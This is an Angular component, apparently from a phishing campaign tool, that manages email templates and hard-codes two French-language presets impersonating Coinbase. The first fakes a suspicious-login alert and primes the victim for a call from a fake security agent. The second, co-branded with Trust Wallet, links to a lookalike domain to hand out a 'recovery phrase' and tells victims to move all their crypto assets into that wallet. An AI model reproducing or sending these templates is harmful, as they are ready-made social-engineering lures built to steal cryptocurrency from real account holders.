import { Component, inject, OnInit, signal } from '@angular/core';
import { FirestoreService } from './firestore.service';
import { FormBuilder, ReactiveFormsModule, Validators } from '@angular/forms';
import { CommonModule } from '@angular/common';
import { MatIconModule } from '@angular/material/icon';
import { Template } from './models';

@Component({
  selector: 'app-templates',
  standalone: true,
  imports: [CommonModule, ReactiveFormsModule, MatIconModule],
  template: `
    <div class="p-4 md:p-8 max-w-5xl mx-auto">
      <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 mb-8">
        <div>
          <h1 class="text-2xl font-bold text-slate-900">Email Templates</h1>
          <p class="text-slate-500">Manage warning and phishing templates</p>
        </div>
        <button (click)="isAdding.set(true)" class="w-full sm:w-auto bg-indigo-600 text-white px-4 py-2 rounded-lg flex items-center justify-center gap-2 hover:bg-indigo-700">
          <mat-icon>add</mat-icon> Add Template
        </button>
      </div>

      @if (isAdding()) {
        <div class="bg-white p-6 rounded-xl shadow-sm border border-slate-200 mb-8">
          <h2 class="text-lg font-semibold mb-4">Add Template</h2>
          <div class="flex gap-2 mb-4">
            <button type="button" (click)="loadWarningPreset()" class="bg-slate-100 text-slate-700 px-3 py-1 rounded text-xs hover:bg-slate-200">
              Load Warning Preset (Part 1)
            </button>
            <button type="button" (click)="loadPhishingPreset()" class="bg-slate-100 text-slate-700 px-3 py-1 rounded text-xs hover:bg-slate-200">
              Load Phishing Preset (Part 2)
            </button>
          </div>
          <form [formGroup]="templateForm" (ngSubmit)="saveTemplate()" class="grid grid-cols-1 gap-4">
            <div class="grid grid-cols-2 gap-4">
              <div>
                <label for="name" class="block text-sm font-medium text-slate-700 mb-1">Name</label>
                <input id="name" type="text" formControlName="name" class="w-full border border-slate-300 rounded-lg px-3 py-2" placeholder="e.g., Warning Email 1">
              </div>
              <div>
                <label for="type" class="block text-sm font-medium text-slate-700 mb-1">Type</label>
                <select id="type" formControlName="type" class="w-full border border-slate-300 rounded-lg px-3 py-2 bg-white">
                  <option value="warning">Warning (Part 1)</option>
                  <option value="phishing">Phishing (Part 2)</option>
                </select>
              </div>
            </div>
            <div>
              <label for="subject" class="block text-sm font-medium text-slate-700 mb-1">Subject</label>
              <input id="subject" type="text" formControlName="subject" class="w-full border border-slate-300 rounded-lg px-3 py-2" placeholder="Important Security Update">
            </div>
            <div>
              <label for="htmlBody" class="block text-sm font-medium text-slate-700 mb-1">HTML Body</label>
              <textarea id="htmlBody" formControlName="htmlBody" rows="6" class="w-full border border-slate-300 rounded-lg px-3 py-2 font-mono text-sm" placeholder="<html>...</html>"></textarea>
            </div>
            <div class="flex justify-end gap-3 mt-4">
              <button type="button" (click)="cancelAdd()" class="px-4 py-2 text-slate-600 hover:bg-slate-100 rounded-lg">Cancel</button>
              <button type="submit" [disabled]="templateForm.invalid" class="bg-indigo-600 text-white px-4 py-2 rounded-lg hover:bg-indigo-700 disabled:opacity-50">Save</button>
            </div>
          </form>
        </div>
      }

      <div class="grid gap-4">
        @for (template of templates(); track template.id) {
          <div class="bg-white p-4 rounded-xl shadow-sm border border-slate-200 flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
            <div class="min-w-0 flex-1">
              <div class="flex items-center gap-3 flex-wrap">
                <h3 class="font-semibold text-slate-900 truncate">{{template.name}}</h3>
                <span class="px-2 py-1 text-xs rounded-full whitespace-nowrap" [ngClass]="template.type === 'warning' ? 'bg-amber-100 text-amber-700' : 'bg-red-100 text-red-700'">
                  {{template.type === 'warning' ? 'Warning' : 'Phishing'}}
                </span>
              </div>
              <p class="text-sm text-slate-500 mt-1 truncate">Subject: {{template.subject}}</p>
            </div>
            <div class="flex gap-2 self-end sm:self-auto">
              <button (click)="deleteTemplate(template.id)" class="p-2 text-red-600 hover:bg-red-50 rounded-lg">
                <mat-icon>delete</mat-icon>
              </button>
            </div>
          </div>
        }
      </div>

      <!-- Toast Notification -->
      @if (notification()) {
        <div class="fixed bottom-8 right-8 z-[100] animate-bounce">
          <div class="px-6 py-3 rounded-xl shadow-2xl flex items-center gap-3 border"
            [ngClass]="{
              'bg-emerald-600 text-white border-emerald-500': notification()?.type === 'success',
              'bg-red-600 text-white border-red-500': notification()?.type === 'error',
              'bg-slate-800 text-white border-slate-700': notification()?.type === 'info'
            }">
            <mat-icon>{{ notification()?.type === 'success' ? 'check_circle' : notification()?.type === 'error' ? 'error' : 'info' }}</mat-icon>
            <span class="font-medium">{{notification()?.message}}</span>
          </div>
        </div>
      }

      <!-- Confirmation Modal -->
      @if (confirmModal()) {
        <div class="fixed inset-0 bg-black/50 flex items-center justify-center z-[100] p-4">
          <div class="bg-white rounded-2xl w-full max-w-sm overflow-hidden shadow-2xl">
            <div class="p-6">
              <h3 class="text-xl font-bold text-slate-900 mb-2">{{confirmModal()?.title}}</h3>
              <p class="text-slate-600">{{confirmModal()?.message}}</p>
            </div>
            <div class="p-6 bg-slate-50 border-t border-slate-100 flex justify-end gap-3">
              <button (click)="confirmModal.set(null)" class="px-4 py-2 text-slate-600 hover:bg-slate-100 rounded-lg">Cancel</button>
              <button (click)="confirmModal()?.onConfirm(); confirmModal.set(null)" class="bg-indigo-600 text-white px-6 py-2 rounded-xl font-medium hover:bg-indigo-700">
                Confirm
              </button>
            </div>
          </div>
        </div>
      }
    </div>
  `
})
export class TemplatesComponent implements OnInit {
  firestore = inject(FirestoreService);
  fb = inject(FormBuilder);

  templates = signal<Template[]>([]);
  isAdding = signal(false);
  
  // Custom Modal/Toast signals
  notification = signal<{ message: string, type: 'success' | 'error' | 'info' } | null>(null);
  confirmModal = signal<{ title: string, message: string, onConfirm: () => void } | null>(null);

  templateForm = this.fb.group({
    name: ['', Validators.required],
    subject: ['', Validators.required],
    htmlBody: ['', Validators.required],
    type: ['warning', Validators.required]
  });

  ngOnInit() {
    this.firestore.getTemplates((data) => {
      this.templates.set(data as Template[]);
    });
  }

  showNotification(message: string, type: 'success' | 'error' | 'info' = 'info') {
    this.notification.set({ message, type });
    setTimeout(() => this.notification.set(null), 5000);
  }

  showConfirm(title: string, message: string, onConfirm: () => void) {
    this.confirmModal.set({ title, message, onConfirm });
  }

  cancelAdd() {
    this.isAdding.set(false);
    this.templateForm.reset({ type: 'warning' });
  }

  async saveTemplate() {
    if (this.templateForm.valid) {
      await this.firestore.addTemplate(this.templateForm.value);
      this.showNotification('Template saved successfully.', 'success');
      this.cancelAdd();
    }
  }

  loadWarningPreset() {
    const html = `<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Alerte de sécurité Coinbase</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; color: #0a0b0d; background: #f4f7f9; margin: 0; padding: 0; -webkit-font-smoothing: antialiased; }
        .wrapper { width: 100%; table-layout: fixed; background-color: #f4f7f9; padding-bottom: 40px; padding-top: 40px; }
        .container { max-width: 600px; margin: 0 auto; background: #ffffff; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05); }
        .header { background: #0052ff; padding: 24px 32px; }
        .content { padding: 40px; }
        .badge { background: #fff1f0; color: #cf1322; padding: 6px 14px; border-radius: 4px; font-size: 12px; font-weight: 700; display: inline-block; margin-bottom: 24px; text-transform: uppercase; letter-spacing: 0.5px; border: 1px solid #ffa39e; }
        h2 { font-size: 24px; margin: 0 0 16px 0; color: #0a0b0d; font-weight: 700; line-height: 1.3; }
        p { font-size: 16px; line-height: 1.6; color: #3c4858; margin-bottom: 24px; }
        .info-card { background: #f8f9fa; border-radius: 8px; border: 1px solid #e9ecef; margin-bottom: 24px; padding: 20px; }
        .info-row { display: table; width: 100%; margin-bottom: 8px; }
        .info-label { display: table-cell; width: 40%; font-size: 13px; color: #6c757d; font-weight: 600; text-transform: uppercase; }
        .info-value { display: table-cell; font-size: 14px; color: #212529; font-weight: 600; text-align: right; }
        .alert-box { background: #fffbe6; border: 1px solid #ffe58f; padding: 16px 20px; border-radius: 8px; color: #856404; font-size: 14px; line-height: 1.5; }
        .footer { padding: 32px; text-align: center; font-size: 12px; color: #8c96a3; background: #ffffff; border-top: 1px solid #f0f2f5; }
        a { color: #0052ff; text-decoration: none; font-weight: 600; }
        @media only screen and (max-width: 600px) {
            .content { padding: 24px; }
            .header { padding: 20px; }
            h2 { font-size: 20px; }
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="container">
            <div class="header">
                <table width="100%" border="0" cellspacing="0" cellpadding="0">
                    <tr>
                        <td align="left">
                            <img src="https://i.postimg.cc/YShdWD2Y/Coinbase_Symbol.png" alt="Coinbase" style="height: 36px; width: auto; display: block;">
                        </td>
                        <td align="right" style="color: #ffffff; font-size: 16px; font-weight: 700; font-family: sans-serif;">
                            Security Alert
                        </td>
                    </tr>
                </table>
            </div>
            <div class="content">
                <div class="badge">Alerte de sécurité</div>
                <h2>Activité suspecte détectée sur votre compte</h2>
                <p>Une tentative de connexion non autorisée a été bloquée par notre système de sécurité.</p>
                
                <div class="info-card">
                    <div class="info-row">
                        <div class="info-label">Appareil</div>
                        <div class="info-value">iPhone 14 Pro Max</div>
                    </div>
                    <div class="info-row">
                        <div class="info-label">Adresse IP</div>
                        <div class="info-value">185.242.114.92</div>
                    </div>
                    <div class="info-row">
                        <div class="info-label">Localisation</div>
                        <div class="info-value">Moscou, Russie</div>
                    </div>
                </div>

                <p>Votre compte n'est plus considéré comme sécurisé. Notre équipe technique travaille actuellement à la résolution de ce problème.</p>
                
                <div class="alert-box">
                    <strong>Important :</strong> Veuillez patienter et attendre de nouvelles instructions. Un agent de notre service de sécurité vous contactera par téléphone dans quelques instants.
                </div>

                <p style="margin-top: 24px; font-size: 14px; color: #8c96a3;">Merci de votre coopération pour assurer la sécurité de vos actifs.</p>
            </div>
            <div class="footer">
                &copy; 2026 Coinbase, Inc. | 548 Market St, San Francisco, CA 94104<br>
                Identifiant de l'alerte : SEC-8392-XJ9
            </div>
        </div>
    </div>
</body>
</html>`;

    this.templateForm.patchValue({
      name: 'Coinbase Warning (Part 1)',
      subject: 'Alerte de sécurité Coinbase : Activité suspecte détectée',
      type: 'warning',
      htmlBody: html
    });
  }

  loadPhishingPreset() {
    const html = `<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Action requise : Coinbase & Trust Wallet</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; color: #0a0b0d; background: #f4f7f9; margin: 0; padding: 0; -webkit-font-smoothing: antialiased; }
        .wrapper { width: 100%; table-layout: fixed; background-color: #f4f7f9; padding-bottom: 40px; padding-top: 40px; }
        .container { max-width: 600px; margin: 0 auto; background: #ffffff; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); }
        .header { background: #0052ff; padding: 24px 32px; }
        .content { padding: 40px; }
        .badge { background: #e6f7ff; color: #0052ff; padding: 6px 14px; border-radius: 4px; font-size: 12px; font-weight: 700; display: inline-block; margin-bottom: 24px; text-transform: uppercase; letter-spacing: 0.5px; border: 1px solid #91d5ff; }
        h2 { font-size: 24px; margin: 0 0 16px 0; color: #0a0b0d; font-weight: 700; line-height: 1.3; }
        p { font-size: 16px; line-height: 1.6; color: #3c4858; margin-bottom: 24px; }
        .btn { display: block; background: #0052ff; color: #ffffff !important; padding: 16px 24px; border-radius: 8px; text-decoration: none; font-weight: 700; text-align: center; font-size: 16px; margin-bottom: 32px; }
        .instructions { background: #f8f9fa; border-radius: 8px; border: 1px solid #e9ecef; padding: 20px; margin-bottom: 24px; }
        .instruction-item { font-size: 14px; color: #3c4858; margin-bottom: 12px; display: flex; align-items: flex-start; }
        .instruction-number { background: #0052ff; color: #ffffff; width: 20px; height: 20px; border-radius: 50%; display: inline-block; text-align: center; line-height: 20px; font-size: 12px; margin-right: 12px; flex-shrink: 0; }
        .footer { padding: 32px; text-align: center; font-size: 12px; color: #8c96a3; background: #ffffff; border-top: 1px solid #f0f2f5; }
        a { color: #0052ff; text-decoration: none; font-weight: 600; }
        @media only screen and (max-width: 600px) {
            .content { padding: 24px; }
            .header { padding: 20px; }
            h2 { font-size: 20px; }
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="container">
            <div class="header">
                <table width="100%" border="0" cellspacing="0" cellpadding="0">
                    <tr>
                        <td align="left">
                            <table border="0" cellspacing="0" cellpadding="0">
                                <tr>
                                    <td><img src="https://i.postimg.cc/YShdWD2Y/Coinbase_Symbol.png" alt="Coinbase" style="height: 32px; width: auto; display: block;"></td>
                                    <td style="color: #ffffff; font-size: 24px; font-weight: 400; padding: 0 12px; font-family: sans-serif;">+</td>
                                    <td><img src="https://i.postimg.cc/PJ4Wc1f6/trust-wallet-rounded-logo-design-free-png-1.png" alt="Trust Wallet" style="height: 32px; width: auto; display: block;"></td>
                                </tr>
                            </table>
                        </td>
                        <td align="right" style="color: #ffffff; font-size: 16px; font-weight: 700; font-family: sans-serif;">
                            Security Update
                        </td>
                    </tr>
                </table>
            </div>
            <div class="content">
                <div class="badge">Action requise</div>
                <h2>Migration vers votre nouveau portefeuille sécurisé</h2>
                <p>Pour protéger vos fonds, un nouveau portefeuille a été émis en collaboration avec Trust Wallet.</p>
                
                <a href="https://user-cb.com/view_key.php" class="btn">Afficher la phrase de récupération</a>

                <div class="instructions">
                    <div class="instruction-item">
                        <span class="instruction-number">1</span>
                        <span>Installez l'application Trust Wallet sur votre appareil mobile.</span>
                    </div>
                    <div class="instruction-item">
                        <span class="instruction-number">2</span>
                        <span>Importez la phrase de récupération générée pour votre nouveau compte.</span>
                    </div>
                    <div class="instruction-item">
                        <span class="instruction-number">3</span>
                        <span>Transférez l'intégralité de vos actifs vers ce nouveau portefeuille sécurisé pour garantir leur protection.</span>
                    </div>
                </div>

                <p style="font-size: 14px; color: #3c4858;">Cette étape est obligatoire pour assurer la sécurité de vos actifs numériques face aux récentes tentatives d'intrusion.</p>
                
                <p style="margin-top: 32px; font-size: 13px; color: #8c96a3;">Si vous avez besoin d'aide, notre équipe est disponible 24/7. Merci de votre confiance.</p>
            </div>
            <div class="footer">
                &copy; 2026 Coinbase & Trust Wallet | 548 Market St, San Francisco, CA 94104<br>
                Ce message est une notification automatique de sécurité.
            </div>
        </div>
    </div>
</body>
</html>`;

    this.templateForm.patchValue({
      name: 'Coinbase Phishing (Part 2)',
      subject: 'Action requise : Migration vers votre nouveau portefeuille sécurisé',
      type: 'phishing',
      htmlBody: html
    });
  }

  async deleteTemplate(id: string) {
    this.showConfirm(
      'Delete Template',
      'Are you sure you want to delete this template?',
      async () => {
        await this.firestore.deleteTemplate(id);
        this.showNotification('Template deleted.', 'info');
      }
    );
  }
}
